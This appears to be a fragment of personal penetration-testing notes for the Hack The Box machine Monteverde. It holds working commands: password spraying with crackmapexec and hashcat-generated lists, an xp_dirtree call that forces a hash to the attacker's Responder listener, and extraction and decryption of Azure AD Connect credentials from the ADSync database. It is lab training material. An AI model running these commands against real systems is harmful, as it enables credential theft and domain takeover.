...
- In AD found the users from rpcclient and ldap then users has some ADD_Something then generated passwords from hashcat with usernames got rpcclient
- Before doing the above step try to brute force crackmapexec for both usernames and passwords as a username file 
...
#Hashcat generate password
hashcat --force --stdout -r /usr/share/hashcat/rules/best64.rule users_rpc > password.lst # file users_rpc is usernames file and password.lst is generated by hashcat
crackmapexec smb 10.10.10.172 -u users_rpc -p users_rpc # Monteverde from HacktheBox
```
...
```
### PowerUpSQL Windows MSSQL get password
- I has situation ran the winPEAS shows mssql, go for PowerUpSQL [Cheatsheet](https://github.com/NetSPI/PowerUpSQL/wiki/PowerUpSQL-Cheat-Sheet)
- Windows powershell mssql command line
- Reference Monteverde HTB
```powershell
sqlcmd -?
sqlcmd -Q "select * from sys.tables"
sqlcmd -Q "select name,create_date from sys.databases"
. .\PowerUpSQL
Get-SQLInstanceLocal -Verbose # Need a permission 'Get-WmiObject -Class win32_service'
#Privilege Escalation
Invoke-SQLAudit -Verbose # give Exploitable 'XP_DIRTREE' how that It will show the vulnerabilities of SQL vulnerable and exploitable
sqlcmd -Q "xp_dirtree '\\10.10.14.2\test'" # To trigger kali to get hash
sudo responder -I tun0 -v # Getting hash
# This hash not crackable moved to another path Azure AD exploittion
```

### Windows Azure AD password extraction WinPrivEsc
- In windows machine has Azure AD configured [article](https://blog.xpnsec.com/azuread-connect-for-redteam/)
- Code to get the encrypted password [code](https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545), 
- Reference Monteverde HTB 
```powershell
sqlcmd -Q "Use ADSync; select private_configuration_xml from mms_management_agent" Details of user, ADSync is Database
sqlcmd -Q "Use ADSync; select private_configuration_xml,encrypted_configuration from mms_management_agent" # Get encrypted password
sqlcmd -Q "Use ADSync; select keyset_id, instance_id, entropy FROM mms_server_configuration" # PAssword is decrypted using these fields
# Changed this line in the first line(ippsec video for Monteverde video) '$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=localhost;Integrated Security=true;Initial Catalog=ADSync"'
.\decrypt.ps1 # Got the admin password, Check the ippsec video for Monteverde video
# Looged into administrator
# DNS DUMP
Export-DNSServerZone -FileName MEGABANK.LOCAL -Name MEGABANK.LOCAL
# powershell File search
gci -recurse -include MEGABANK* # filename is MEGABANK.something
```
